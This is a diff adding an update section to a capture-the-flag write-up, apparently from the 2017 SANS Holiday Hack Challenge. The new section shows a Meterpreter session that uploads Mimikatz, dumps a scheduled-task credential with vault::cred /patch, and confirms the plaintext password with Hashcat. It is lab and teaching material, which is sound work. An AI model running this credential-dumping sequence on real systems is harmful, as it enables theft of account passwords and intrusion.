@@ -421,7 +421,7 @@ Armed with a password, we can remote desktop:
 [[./images/alabaster_rdp.png]]
 
 Woot! We're hand-waving some of this for now, as there will be a
-longer discussion about [[#passphrases][how we cracked passwords]].
+longer discussion about [[#passphrases][how we cracked passwords].
 
 * Next up -- Privilege Escalation!
 
@@ -831,3 +831,69 @@ We did, however, find some neat things in the Firefox browsing history of the sy
 'http://localhost/jerry.aspx'
 'http://localhost/ok.txt'
 #+END_SRC
+
+* Update -- Cracking sysadmin's Password
+After doing a bit more digging around on this after the submission
+deadline had passed, we were able to crack sysadmin's password, thanks
+to [[https://github.com/gentilkiwi/mimikatz][Mimikatz]].
+
+Once we had our Meterpreter shell, running as the system user, we could upload Mimikatz, and have it dump some credentials:
+
+#+BEGIN_SRC 
+meterpreter > cd %temp%                                                                                                                                                                                                                                                                            │···············································
+meterpreter > upload mimikatz.exe                                                                                                                                                                                                                                                                  │···············································
+[*] uploading  : mimikatz.exe -> mimikatz.exe                                                                                                                                                                                                                                                      │···············································
+[*] uploaded   : mimikatz.exe -> mimikatz.exe                                                                                                                                                                                                                                                      │···············································
+meterpreter > shell                                                                                                                                                                                                                                                                                │···············································
+Process 852 created.                                                                                                                                                                                                                                                                               │···············································
+Channel 2 created.                                                                                                                                                                                                                                                                                 │···············································
+Microsoft Windows [Version 10.0.14393]                                                                                                                                                                                                                                                             │···············································
+(c) 2016 Microsoft Corporation. All rights reserved.                                                                                                                                                                                                                                               │···············································
+                                                                                                                                                                                                                                                                                                   │···············································
+C:\Windows\TEMP>mimikatz                                                                                                                                                                                                                                                                           │···············································
+mimikatz                                                                                                                                                                                                                                                                                           │···············································
+                                                                                                                                                                                                                                                                                                   │···············································
+  .#####.   mimikatz 2.1.1 (x64) built on Nov  6 2017 03:34:10                                                                                                                                                                                                                                     │···············································
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                                                                                                                                                                        │···············································
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                                                                                                                           │···············································
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                                                                                                                                                                             │···············································
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                                                                                                                                                                          │···············································
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                                                                                                                                                                                                          │···············································
+                                                                                                                                                                                                                                                                                                   │···············································
+mimikatz # vault::cred /patch                                                                                                                                                                                                                                                                      │···············································
+TargetName : Domain:batch=TaskScheduler:Task:{B7934FDF-0D61-4B73-89D2-85301C3C3261} / <NULL>                                                                                                                                                                                                       │···············································
+UserName   : HHC17-SMB-SERVE\sysadmin                                                                                                                                                                                                                                                              │···············································
+Comment    : <NULL>                                                                                                                                                                                                                                                                                │···············································
+Type       : 2 - domain_password                                                                                                                                                                                                                                                                   │···············································
+Persist    : 2 - local_machine                                                                                                                                                                                                                                                                     │···············································
+Flags      : 00004004                                                                                                                                                                                                                                                                              │···············································
+Credential : #9tsTizMj#TZgTQ                                                                                                                                                                                                                                                                       │···············································
+Attributes : 0                                                                                                                                                                                                                                                                                     │···············································
+                                                                                                                                                                                                                                                                                                   │···············································
+TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>                                                                                                                                                                                                                                     │···············································
+UserName   : 02corgxfsbee                                                                                                                                                                                                                                                                          │···············································
+Comment    : PersistedCredential                                                                                                                                                                                                                                                                   │···············································
+Type       : 1 - generic                                                                                                                                                                                                                                                                           │···············································
+Persist    : 2 - local_machine                                                                                                                                                                                                                                                                     │···············································
+Flags      : 00000000                                                                                                                                                                                                                                                                              │···············································
+Credential :                                                                                                                                                                                                                                                                                       │···············································
+Attributes : 32
+#+END_SRC
+
+Mimikatz was able to pull out sysadmin's decrypted password, from a scheduled task. We can use Hashcat to verify this password:
+
+#+BEGIN_SRC 
+echo "#9tsTizMj#TZgTQ" | hashcat -a 0 -m 1000 -w 3 emi.hashes
+hashcat (v4.0.1) starting...
+
+...
+
+Starting attack in stdin mode...
+
+27309e9a73764938860b4a1ed7c0392b:#9tsTizMj#TZgTQ
+#+END_SRC
+
+However, we still couldn't use this password to move laterally to
+other systems. But with this credential, we were able to crack all the
+passwords we found, except for the password all the reindeer LDAP
+accounts were set to.
